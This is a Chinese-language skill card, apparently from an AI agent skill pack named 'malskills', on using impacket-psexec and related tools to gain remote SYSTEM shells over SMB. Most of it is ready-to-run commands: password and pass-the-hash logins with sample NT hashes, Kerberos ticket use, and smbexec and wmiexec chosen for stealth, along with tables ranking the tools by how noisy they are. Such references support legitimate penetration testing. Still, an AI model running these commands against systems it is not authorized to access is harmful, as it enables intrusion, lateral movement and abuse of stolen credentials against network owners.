---
name: "psexec"
description: ">"
---

# Psexec

*Sourced from killvxk-malskills-zh*

# psexec (impacket)

通过 SMB 获取远程 SYSTEM shell —— impacket 套件的一部分。创建服务、将远程 shell 二进制文件上传至 ADMIN$，然后执行。

## 快速开始

```bash
# 密码认证
impacket-psexec domain/user:password@192.168.1.10

# 哈希传递 (Pass-the-Hash)
impacket-psexec administrator@192.168.1.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# 本地账号
impacket-psexec WORKGROUP/administrator:password@192.168.1.10
```

## 核心参数

| 参数 | 说明 |
|------|------|
| `domain/user:pass@target` | 标准认证字符串 |
| `-hashes <LM:NT>` | 哈希传递（仅 NT 哈希时用 `:NT`） |
| `-no-pass` | 无密码（用于空会话） |
| `-k` | Kerberos 认证 |
| `-dc-ip <ip>` | 域控制器 IP |
| `-port <n>` | 自定义 SMB 端口 |
| `-service-name <n>` | 自定义服务名（默认随机） |
| `-remote-binary-name <n>` | 自定义远程二进制文件名 |
| `-shell-type <type>` | Shell 类型：`cmd` 或 `powershell` |
| `-codec <enc>` | 输出编码（默认自动检测） |

## Impacket 执行替代工具

| 工具 | 方法 | 说明 |
|------|------|------|
| `psexec.py` | 服务 + ADMIN$ 二进制文件 | SYSTEM shell；噪音大（会创建服务） |
| `smbexec.py` | 服务 + cmd.exe | 不落盘；半交互式 |
| `wmiexec.py` | WMI + cmd.exe | 半交互式；不创建服务 |
| `atexec.py` | 任务计划程序 | 单条命令；无交互 shell |
| `dcomexec.py` | DCOM | 多种 DCOM 对象选项 |

## 常用工作流程

```bash
# 凭据获取 SYSTEM shell
impacket-psexec corp.local/admin:Password123@10.10.10.10

# 哈希传递（现代 Windows 无需 LM 哈希）
impacket-psexec -hashes :f6f38b793db6a78dc379eee9e56b8c91 administrator@10.10.10.10

# PowerShell shell
impacket-psexec admin:pass@10.10.10.10 -shell-type powershell

# 执行单条命令（非交互式推荐 wmiexec）
impacket-wmiexec admin:pass@10.10.10.10 "net user"

# 更隐蔽：smbexec（无二进制落盘）
impacket-smbexec admin:pass@10.10.10.10

# Kerberos 认证（使用 CCACHE）
export KRB5CCNAME=/tmp/admin.ccache
impacket-psexec -k -no-pass corp.local/admin@dc.corp.local
```

## 资源

| 文件 | 加载时机 |
|------|----------|
| `references/impacket-suite.md` | impacket 工具完整参考、secretsdump、GetUserSPNs、票据攻击 |

